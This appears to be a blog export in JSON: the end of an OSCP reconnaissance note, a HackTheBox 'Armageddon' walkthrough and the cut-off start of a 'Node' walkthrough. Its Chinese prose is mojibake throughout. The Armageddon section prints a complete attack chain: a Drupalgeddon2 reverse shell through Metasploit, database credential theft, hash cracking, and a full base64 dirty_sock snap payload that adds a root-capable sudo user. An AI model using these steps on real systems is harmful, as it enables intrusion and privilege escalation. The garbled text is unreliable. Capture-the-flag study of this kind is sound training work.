æ˜¯ä¸€ä¸ªç¤¾äº¤åª’ä½“ç½‘ç«™çš„æœç´¢å¼•æ“ã€‚ä¸€ä¸ªå…è´¹çš„è´¦æˆ·å°†å…è®¸æ¯å¤©æœ‰é™çš„æœç´¢æ¬¡æ•°ã€‚Social-Searcher å¯ä»¥æˆä¸ºåœ¨å¤šä¸ªæ›´ä¸“ä¸šçš„æœåŠ¡ä¸Šè®¾ç½® API ç§˜é’¥çš„ä¸€ä¸ªå¿«é€Ÿæ›¿ä»£æ–¹æ¡ˆã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9203d2aa-8883-4c67-9f49-7566ef446b98/Untitled.png)\n\næœç´¢ç»“æœå°†åŒ…æ‹¬ç›®æ ‡ç»„ç»‡å‘å¸ƒçš„ä¿¡æ¯ä»¥åŠäººä»¬å¯¹å…¶çš„è¯„ä»·ã€‚é™¤å…¶ä»–äº‹é¡¹å¤–ï¼Œè¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç¡®å®šä¸€ä¸ªç»„ç»‡åœ¨ç¤¾äº¤åª’ä½“ä¸Šæœ‰ä»€ä¹ˆæ ·çš„è¶³è¿¹å’Œè¦†ç›–é¢ã€‚ä¸€æ—¦æˆ‘ä»¬å®Œæˆäº†è¿™äº›ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé€‰æ‹©ç»§ç»­ä½¿ç”¨ç‰¹å®šåœ°ç‚¹çš„å·¥å…·ã€‚\n\n### ç‰¹å®šåœ°ç‚¹çš„å·¥å…·\n\næœ‰ä¸¤ä¸ªç‰¹å®šç½‘ç«™çš„å·¥å…·ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³ç†Ÿæ‚‰ä¸€ä¸‹ã€‚\n\nTwofi æ‰«æç”¨æˆ·çš„ Twitter ä¿¡æ¯ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªä¸ªæ€§åŒ–çš„å•è¯è¡¨ï¼Œç”¨äºå¯¹è¯¥ç”¨æˆ·çš„å¯†ç æ”»å‡»ã€‚è™½ç„¶æˆ‘ä»¬ä¸ä¼šåœ¨è¢«åŠ¨çš„ä¿¡æ¯æ”¶é›†è¿‡ç¨‹ä¸­è¿›è¡Œä»»ä½•æ”»å‡»ï¼Œä½†æˆ‘ä»¬å¯ä»¥é’ˆå¯¹æˆ‘ä»¬å·²ç»ç¡®å®šçš„ä»»ä½• Twitter è´¦æˆ·è¿è¡Œè¿™ä¸ªå·¥å…·ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶å‡†å¤‡å¥½ä¸€ä¸ªè¯è¡¨ã€‚Twofi éœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„ Twitter API ç§˜é’¥ã€‚\n\nlinkedin2username æ˜¯ä¸€ä¸ªåŸºäº LinkedIn æ•°æ®ç”Ÿæˆç”¨æˆ·ååˆ—è¡¨çš„è„šæœ¬ã€‚å®ƒéœ€è¦æœ‰æ•ˆçš„ LinkedIn å‡­è¯ï¼Œå¹¶ä¾èµ–äºä¸ç›®æ ‡ç»„ç»‡ä¸­çš„ä¸ªäººçš„ LinkedIn è¿æ¥ã€‚è¯¥è„šæœ¬å°†è¾“å‡ºå‡ ç§ä¸åŒæ ¼å¼çš„ç”¨æˆ·åã€‚\n\n## Stack Overflow\n\nStack Overflow æ˜¯ä¸€ä¸ªä¾›å¼€å‘äººå‘˜æå‡ºå’Œå›ç­”ç¼–ç ç›¸å…³é—®é¢˜çš„ç½‘ç«™ã€‚\n\nä»ä¿¡æ¯æ”¶é›†çš„è§’åº¦æ¥çœ‹ï¼Œè¯¥ç½‘ç«™çš„ä»·å€¼åœ¨äºè§‚å¯Ÿä¸€ä¸ªç‰¹å®šçš„ç”¨æˆ·æ‰€æå‡ºæˆ–å›ç­”çš„é—®é¢˜çš„ç±»å‹ã€‚å¦‚æœæˆ‘ä»¬èƒ½åˆç†åœ°ç¡®å®š Stack Overflow ä¸Šçš„ç”¨æˆ·ä¹Ÿæ˜¯æˆ‘ä»¬ç›®æ ‡ç»„ç»‡çš„å‘˜å·¥ï¼Œæˆ‘ä»¬å°±èƒ½æ ¹æ®è¯¥å‘˜å·¥çš„é—®é¢˜å’Œå›ç­”æ¨æ–­å‡ºè¯¥ç»„ç»‡çš„ä¸€äº›æƒ…å†µã€‚\n\nä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å‘ç°ä¸€ä¸ªç”¨æˆ·æ€»æ˜¯åœ¨è¯¢é—®å’Œå›ç­”å…³äº Python çš„é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰ç†ç”±è®¤ä¸ºä»–ä»¬æ¯å¤©éƒ½åœ¨ä½¿ç”¨è¿™ç§ç¼–ç¨‹è¯­è¨€ï¼Œè€Œä¸”å¾ˆå¯èƒ½æ˜¯ä»–ä»¬æ‰€åœ¨çš„ç»„ç»‡ä¸­ä½¿ç”¨ã€‚\n\næ›´ç³Ÿç³•çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å‘ç°å‘˜å·¥åœ¨è¿™äº›ç±»å‹çš„è®ºå›ä¸Šè®¨è®ºæ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ¼æ´ä¿®å¤ï¼Œæˆ‘ä»¬å¯èƒ½åœ¨è¿™ä¸ªé˜¶æ®µå‘ç°æœªä¿®è¡¥çš„æ¼æ´ã€‚\n\n## ä¿¡æ¯æ”¶é›†æ¡†æ¶\n\nåœ¨æœ¬æ¨¡å—çš„æœ€åï¼Œæˆ‘ä»¬å°†ç®€è¦åœ°æåˆ°ä¸¤ä¸ªé¢å¤–çš„å·¥å…·ï¼Œå®ƒä»¬èåˆäº†æˆ‘ä»¬è®¨è®ºè¿‡çš„è®¸å¤šæŠ€æœ¯ï¼Œå¹¶å¢åŠ äº†é¢å¤–çš„åŠŸèƒ½ã€‚è¿™äº›å·¥å…·å¯¹äºæˆ‘ä»¬å°†åœ¨å®éªŒå®¤ä¸­è¿›è¡Œçš„å·¥ä½œæ¥è¯´é€šå¸¸è¿‡äºæ²‰é‡ï¼Œä½†åœ¨ç°å®ä¸–ç•Œçš„è¯„ä¼°ä¸­å®ƒä»¬æ˜¯æœ‰ä»·å€¼çš„ã€‚\n\n### OSINT æ¡†æ¶\n\nOSINT æ¡†æ¶åŒ…æ‹¬åœ¨ä¸€ä¸ªä¸­å¿ƒä½ç½®çš„ä¿¡æ¯æ”¶é›†å·¥å…·å’Œç½‘ç«™ã€‚è¯¥æ¡†æ¶ä¸­æ‰€åˆ—çš„ä¸€äº›å·¥å…·æ¶µç›–äº†æ¯”ä¿¡æ¯å®‰å…¨æ›´å¤šçš„å­¦ç§‘ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d053c2e2-b86c-4e29-8aa5-3fa0e8eaa565/Untitled.png)\n\nOSINT æ¡†æ¶å¹¶ä¸æ„å‘³ç€æ˜¯ä¸€ä¸ªæ£€æŸ¥æ¸…å•ï¼Œä½†å®¡æŸ¥è¿™äº›ç±»åˆ«å’Œå¯ç”¨çš„å·¥å…·å¯èƒ½ä¼šæ¿€å‘å¯¹é¢å¤–ä¿¡æ¯æ”¶é›†æœºä¼šçš„æƒ³æ³•ã€‚\n\n### Maltego\n\nMaltego æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„æ•°æ®æŒ–æ˜å·¥å…·ï¼Œå®ƒæä¾›äº†æ— å°½çš„æœç´¢å·¥å…·å’Œç­–ç•¥ç»„åˆã€‚å®ƒçš„å­¦ä¹ æ›²çº¿å¯èƒ½å¾ˆé™¡å³­ï¼Œå¦ç‡åœ°è¯´ï¼Œå®ƒå¯¹è¿™ä¸ªæ¨¡å—æ¥è¯´æ˜¯å¤šä½™çš„ï¼Œä½†å…¶ä»¤äººå°è±¡æ·±åˆ»çš„èƒ½åŠ›å€¼å¾—ä»‹ç»ä¸€ä¸‹ã€‚\n\nMaltego æœç´¢æ•°ä»¥åƒè®¡çš„åœ¨çº¿æ•°æ®æºï¼Œå¹¶ä½¿ç”¨æå…¶å·§å¦™çš„â€œè½¬æ¢â€æ¥å°†ä¸€ä¸ªä¿¡æ¯è½¬æ¢ä¸ºå¦ä¸€ä¸ªä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æ­£åœ¨è¿›è¡Œä¸€ä¸ªç”¨æˆ·ä¿¡æ¯æ”¶é›†æ´»åŠ¨ï¼Œæˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€ï¼Œå¹¶é€šè¿‡å„ç§è‡ªåŠ¨æœç´¢ï¼Œå°†å…¶â€œè½¬åŒ–â€ä¸ºä¸€ä¸ªç›¸å…³çš„ç”µè¯å·ç æˆ–è¡—é“åœ°å€ã€‚åœ¨ä¸€æ¬¡ç»„ç»‡ä¿¡æ¯æ”¶é›†æ´»åŠ¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªåŸŸåï¼Œå°†å…¶â€œè½¬åŒ–â€ä¸ºä¸€ä¸ªç½‘ç»œæœåŠ¡å™¨ï¼Œç„¶åæ˜¯ç”µå­é‚®ä»¶åœ°å€åˆ—è¡¨ï¼Œç„¶åæ˜¯ç›¸å…³çš„ç¤¾äº¤åª’ä½“è´¦æˆ·åˆ—è¡¨ï¼Œç„¶åæ˜¯è¯¥ç”µå­é‚®ä»¶è´¦æˆ·çš„æ½œåœ¨å¯†ç åˆ—è¡¨ã€‚\n\nç»„åˆæ˜¯æ— ç©·æ— å°½çš„ï¼Œè€Œä¸”å‘ç°çš„ä¿¡æ¯ä»¥å¯æ‰©å±•çš„å›¾è¡¨å½¢å¼å‘ˆç°ï¼Œå…è®¸è½»æ¾çš„ç¼©æ”¾å¯¼èˆªã€‚\n\nMaltego CEï¼ˆMaltego æœ‰é™çš„â€œç¤¾åŒºç‰ˆæœ¬â€ï¼‰åŒ…å«åœ¨ Kali ä¸­ï¼Œéœ€è¦å…è´¹æ³¨å†Œæ‰èƒ½ä½¿ç”¨ã€‚å•†ä¸šç‰ˆæœ¬ä¹Ÿæœ‰ï¼Œå¯ä»¥å¤„ç†æ›´å¤§çš„æ•°æ®é›†ã€‚\n\nå¤šä¸ªä¾›åº”å•†æä¾›çš„ä¿¡æ¯ï¼ŒMaltego å¯ä»¥æ‘„å–å’Œæ˜¾ç¤ºã€‚ç„¶è€Œï¼Œä¸€äº›ä¾›åº”å•†ä¹Ÿå¯¹å…¶æ•°æ®çš„è®¿é—®è¿›è¡Œæ”¶è´¹ã€‚Maltego ä¸éœ€è¦å®Œæˆå®éªŒå®¤ä¸­çš„ä»»ä½•ææ–™ï¼Œä½†å®ƒå¯ä»¥æˆä¸ºå¤§å‹ä¿¡æ¯æ”¶é›†è¡ŒåŠ¨ä¸­ä¸å¯ç¼ºå°‘çš„å·¥å…·ã€‚\n","tags":["OSCP"],"categories":["OSCP"]},{"title":"Armageddon - Hackthebox","url":"/2022/08/04/Hackthebox/Easy/Hackthebox-Armageddon/","content":"\n# é¶åœºä¿¡æ¯\n\n![](Hackthebox-Armageddon/image1.png)\n\n# é¶åœºç±»å‹\n\n![](Hackthebox-Armageddon/image2.png)\n\n# ä¿¡æ¯æœé›†\n\n## NMAP\n\né¦–å…ˆä½¿ç”¨ nmap è¿›è¡Œæ‰«æ\n\n```\nnmap â€“A -sS â€“sC â€“Sv 10.10.10.233\n```\n\n![](Hackthebox-Armageddon/image3.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ80ç«¯å£\n\nåœ¨ 80 ç«¯å£æç¤ºäº†æˆ‘ä»¬å­˜åœ¨ robots.txt æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸œè¥¿å¾ˆå¤š å’±ä»¬è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Armageddon/image4.png)\n\nå…¶ä¸­å¼•èµ·æˆ‘å…´è¶£çš„ä¸œè¥¿å‘¢å°±æ˜¯ `/MAINTAINERS.txt` æ–‡ä»¶äº†\n\nè¿™æ˜¯ç»´æŠ¤æ–‡ä»¶ï¼Œæˆ–è€…è¯´æ˜¯å‡çº§æ–‡ä»¶ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Armageddon/image5.png)\n\næœä¸å…¶ç„¶ï¼Œé‡Œé¢æ­éœ²äº†`Drupal`çš„ç‰ˆæœ¬\n\nåˆ°è¿™é‡Œæ€è·¯å°±æ˜äº†äº†\n\n# æ¼æ´åˆ©ç”¨\n\nå’±ä»¬ç›´æ¥ä½¿ç”¨ msf è¿›è¡Œ getshell\n\nä½¿ç”¨ msfconsole æ‰“å¼€ msf\n\nè¾“å…¥`search drupal`æœç´¢å¯ç”¨çš„exp\n\n![](Hackthebox-Armageddon/image6.png)\n\nå’±ä»¬å¯¹æ¯”ä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œæœ€åä¸€æ¬¡å‡çº§ä¸º7.56ç‰ˆæœ¬ï¼Œå‡çº§æ—¶é—´ä¸º2017-06-21 ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¹‹å‰çš„expéƒ½å¯ä»¥ç›´æ¥passäº†\n\nå’±ä»¬æŠŠç›®å…‰æ”¾åœ¨ `2018-03-28çš„exp` ä¸Š\n\n```\nuse exploit/unix/webapp/drupal_drupalgeddon2\n\noption\n\nset RHOSTS 10.10.10.233\n\nset lhost 10.10.14.135\n\nexploit\n```\n\n![](Hackthebox-Armageddon/image7.png)\n\næˆåŠŸè·å–åˆ°ä¸€ä¸ªshell\n\n![](Hackthebox-Armageddon/image8.png)\n\nå’±ä»¬è¿è¡Œä¸€ä¸‹æ— æ³•æŸ¥çœ‹åˆ°uidï¼Œä½†æ˜¯å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶\n\nä½†æˆ‘åä¸ï¼Œæˆ‘å°±æƒ³çŸ¥é“å½“å‰ç”¨æˆ·æ€ä¹ˆåŠï¼Ÿ\n\nç®€å•\n\nè¾“å…¥ shell\n\n![](Hackthebox-Armageddon/image9.png)\n\nä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å¡ä½äº†ï¼Œä½†åæ¥æƒ³æƒ³ä¸å¯¹ï¼Œå¥½åƒæ˜¯è·å–åˆ°äº†\n\n![](Hackthebox-Armageddon/image10.png)\n\næ‰§è¡Œå‘½ä»¤åç¡®è®¤å‘½ä»¤æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Ÿ\n\né‚£å’±ä»¬å…ˆæƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellå§\n\n```\n/bin/bash â€“i\n```\n\n![](Hackthebox-Armageddon/image11.png)\n\nä¸ä¸€æ ·è¢«æˆ‘æåˆ°shelläº†ï¼Œå¯ç»™æˆ‘NBåäº†ï¼Œå‰ä¼šå„¿è…°\n\n![](Hackthebox-Armageddon/image12.png)\n\nç”¨æˆ·æ˜¯apacheï¼Œæƒé™è¿˜æ˜¯æœ‰ç‚¹ä½å•Šï¼Œå’±ä»¬åœ¨å†…æ ¸é‡Œçœ‹åˆ°äº†ä¸€ä¸ªåŸŸåï¼Œæˆ–è®¸æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸‹æ¥å§ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯å¹²å˜›çš„ï¼Œå’±ä»¬å¾—æƒ³æƒ³åŠæ³•å»æåˆ°æ›´é«˜ä¸€ç‚¹çš„æƒé™\n\næˆ‘åœ¨æŸ¥çœ‹æºç å’Œé…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨ ../sites/default/settings.php ä¸­æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç \n\n![](Hackthebox-Armageddon/image13.png)\n\n```\ndatabase => drupal\n\nusername => drupaluser\n\npassword => CQHEy@9M*m23gBVj\n```\n\nä»–ä¸æ˜¯å¼€å¯äº†22ç«¯å£å—ï¼Œå’±ä»¬ç›´æ¥sshç™»å½•å§\n\n![](Hackthebox-Armageddon/image14.png)\n\nå—¯ï¼Ÿå¯†ç ä¸å¯¹ï¼Ÿå•Šè¿™ï¼Œå°±æœ‰ç‚¹å°´å°¬äº†å‘€\n\næ²¡äº‹å„¿ï¼Œå’±ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ—¢ç„¶ä»å¤–é¢æ¥ä¸è¡Œï¼Œé‚£å’±ä»¬å°±ä»é‡Œé¢æ¥ï¼Œå’³å’³ æ²¡å¼€è½¦å“ˆ è¯·ä¸è¦è„‘è¡¥\n\nåœ¨å’±ä»¬çš„ shell é‡Œç›´æ¥ä½¿ç”¨ mysql è¿›è¡Œç™»å½•\n\n![](Hackthebox-Armageddon/image15.png)\n\nå¾ˆå¥‡æ€ªï¼Œæ­£å¸¸è¾“å…¥è´¦å·å¯†ç ä¼šå¡ä½æˆ–è€…æŠ¥é”™æˆ–è€…å‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿\n\n![](Hackthebox-Armageddon/image16.png)\n\nç»è¿‡å¤šæ–¹æµ‹è¯•ä»¥åŠæŸ¥æ‰¾èµ„æ–™åï¼Œå¾—å‡ºæ­£ç¡®çš„æŸ¥è¯¢å‘½ä»¤\n\n```\nmysql -u \"drupaluser\" -h \"localhost\" \"-pCQHEy@9M*m23gBVj\" \"drupal\" -e \"select uid, name, pass from users;\"\n```\n\n![](Hackthebox-Armageddon/image17.png)\n\nbrucetherealadmin è´¦æˆ·ä¸€çœ‹è¿™ä¹ˆé•¿å°±çŸ¥é“ä¸ç®€å•ï¼Œä¿—è¯è¯´çš„å¥½ï¼Œé•¿çš„äººä¸€å®šä¸ç®€å•ï¼Œå’‹åŠï¼Ÿçˆ†å®ƒï¼\n\nå°†ç”¨æˆ· brucetherealadmin çš„ hash ä¿å­˜ä¸ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶\n\n![](Hackthebox-Armageddon/image18.png)\n\nè¯·å‡ºæˆ‘ä»¬çš„ç¥å™¨john\n\n```\njohn --wordlist=/usr/share/wordlists/rockyou.txt admin\n```\n\nçˆ†ç ´æˆåŠŸ\n\n![](Hackthebox-Armageddon/image19.png)\n\nå¯†ç ä¸º booboo\n\nç°åœ¨å’±ä»¬ç›´æ¥sshç™»å½•å°±å¯ä»¥äº†\n\n```\nssh brucetherealadmin@10.10.10.233\n```\n\n![](Hackthebox-Armageddon/image20.png)\n\nOKï¼Œå’±ä»¬ç°åœ¨æ€»ç®—æ˜¯æœ‰ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·æƒé™äº†\n\n![](Hackthebox-Armageddon/image21.png)\n\næˆåŠŸè·å¾—useræƒé™çš„flag\n\n**æƒé™æå‡**\n\nå’±ä»¬ä½¿ç”¨ `sudo â€“l` æ¥æŸ¥çœ‹ä¸€ä¸‹ sudo æƒé™\n\n![](Hackthebox-Armageddon/image22.png)\n\nå’±ä»¬å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±è°ƒç”¨ root æƒé™å®‰è£… snapï¼Œé‚£æ€è·¯å°±æœ‰äº†å‘€ï¼Œæèµ·æ¥å…„å¼Ÿä»¬\n\nç”Ÿæˆä¸€ä¸ªsnapçš„é©¬\n\nå‚è€ƒé“¾æ¥ï¼š\n\n> Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)ï¼šhttps://shenaniganslabs.io/2019/02/13/Dirty-Sock.html\n\n> Playing with Dirty Sockï¼šhttps://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html\n\nç”ŸæˆæŒ‡ä»¤ï¼š\n\n```\npython2 -c 'print\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\"+ \"A\"*4256 + \"==\"' | base64 -d > exploit.snap\n```\n\n![](Hackthebox-Armageddon/image23.png)\n\nç›´æ¥è¿è¡Œæ”¹æ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ç‚¹é”™è¯¯ï¼Œéœ€è¦æƒ³åŠæ³•è§£å†³ä¸€ä¸‹\n\n![](Hackthebox-Armageddon/image24.png)\n\nåŠ ä¸Š --devmode æˆåŠŸå®‰è£…\n\n```\nsudo /usr/bin/snap install --devmode exploit.snap\n```\n\n![](Hackthebox-Armageddon/image25.png)\n\nåˆ‡æ¢åˆ° dirty_sock ç”¨æˆ·ï¼Œå¯†ç ä¹Ÿæ˜¯ dirty_sock\n\næŸ¥çœ‹ä¸€ä¸‹æƒé™\n\n![](Hackthebox-Armageddon/image26.png)\n\nææƒæˆåŠŸ\n\n![](Hackthebox-Armageddon/image27.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n","tags":["Hackthebox"]},{"title":"Node - Hackthebox","url":"/2022/08/01/Hackthebox/Medium/Hackthebox-Node/","content":"\n# Hackthebox - Node\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Node/1696fad6-1739-400f-9bd9-90de4805f3d0.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Node/e672c742-1d71-49b3-8eb7-6c7e6075f1b1.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.58\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 09:40 CST\nNmap scan report for 10.10.10.58\nHost is up (0.57s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE            VERSION\n22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)\n|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)\n|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)\n3000/tcp open  hadoop-tasktracker Apache Hadoop\n| hadoop-tasktracker-info: \n|_  Logs: /login\n|_http-title: MyPlace\n| hadoop-datanode-info: \n|_  Logs: /login\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.2 - 4.9 (92%), Crestron XPanel control system (90%), Linux 3.13 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 3.5 (87%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   647.66 ms 10.10.14.1\n2   647.71 ms 10.10.10.58\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.80 seconds\n```\n## Http\n![](Hackthebox-Node/b12e40e3-bf31-441b-be2f-8f9cd55e0a69.png)\n\nè¿™è¾¹é¦–é¡µé¢çœ‹åˆ°æœ‰ä¸ªç™»é™†ç‚¹ï¼Œç›´æ¥å»çœ‹çœ‹\n\n![](Hackthebox-Node/61183a1a-65fc-4b2c-a797-a855894e682b.png)\n\næµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œæ²¡è¿›å»ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå…¶ä»–å¯ä»¥ç‚¹çš„ç‚¹äº†ï¼Œfuzz ä¹Ÿæ²¡æ‰¾åˆ°ä»€ä¹ˆä¸œè¥¿\n\n![](Hackthebox-Node/fe9af40b-2fd9-4dbb-8855-1c9235d7f2d9.png)\n\nåœ¨ä¸»é¡µæŠ“åˆ°ä¸€ä¸ª jsï¼Œé‡Œé¢æœ‰ä¸€ä¸ªåœ°å€ /api/usersï¼Œå»çœ‹ä¸€ä¸‹\n\n```bash\n[{\"_id\":\"59a7365b98aa325cc03ee51c\",\"username\":\"myP14ceAdm1nAcc0uNT\",\"password\":\"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af\",\"is_admin\":true},\n{\"_id\":\"59a7368398aa325cc03ee51d\",\"username\":\"tom\",\"password\":\"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240\",\"is_admin\":false},\n{\"_id\":\"59a7368e98aa325cc03ee51e\",\"username\":\"mark\",\"password\":\"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73\",\"is_admin\":false},\n{\"_id\":\"59aa9781cced6f1d1490fce9\",\"username\":\"rastating\",\"password\":\"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0\",\"is_admin\":false}]\n```\nå»å°è¯•è§£å¯†ä¸€ä¸‹\n\n```bash\nusername = myP14ceAdm1nAcc0uNT\npassword = manchester\n```\næˆåŠŸè§£å¯†å‡º myP14ceAdm1nAcc0uNT çš„å¯†ç ï¼Œè¿™æ˜¯ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œå»ç™»é™†é¡µé¢ç™»å½•ä¸€ä¸‹\n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Node/b3fb1d76-8f41-4e86-929f-b8694d6abe2e.png)\n\næˆåŠŸç™»é™†ï¼Œç„¶åæœ‰ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œä¸‹è½½ä¸€ä¸‹\n\n```bash\nwget --header \"Cookie: connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ\" http://10.10.10.58:3000/api/admin/backup\n```\nè¿™ä¸ªæ–‡ä»¶ä¸‹è½½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå°è¯•å¤šæ¬¡éƒ½ä¼šåœ¨å¤§æ¦‚ 0.6% å·¦å³çš„è¿›åº¦åœæ­¢ä¸‹è½½\n\næ‰€ä»¥æˆ‘ä»¬ç”¨ wget è¿›è¡Œè‡ªåŠ¨å¤šæ¬¡å°è¯•ä¸‹è½½ï¼Œç„¶åæŒ‚ç€ç­‰ä¸‹è½½å®Œæˆå§\n\nå¦‚æœè¿˜æ˜¯ä¸è¡Œï¼Œå°±å°è¯•ç”¨ curl è¿›è¡Œè¯·æ±‚\n\n```bash\ncurl -s -XGET -b 'connect.sid=s%3AjDIfsWcluCPkFQHEKYIaZu2c5fEgPznp.td17K8ciAiS8uXhzf4h0SM71BuRxWE%2BdLoPQvRI9XkQ' http://10.10.10.58:3000/api/admin/backup -o myplace.backup\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# file myplace.backup \nmyplace.backup: ASCII text, with very long lines (64652), with no line terminators\n```\næŸ¥çœ‹äº†ä¸€ä¸‹å†…å®¹å’Œç±»å‹ï¼Œæ„Ÿè§‰åƒæ˜¯ base64 ç¼–ç ï¼Œå»è§£ç ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# cat myplace.backup | base64 -d > unknow                                                                                                                               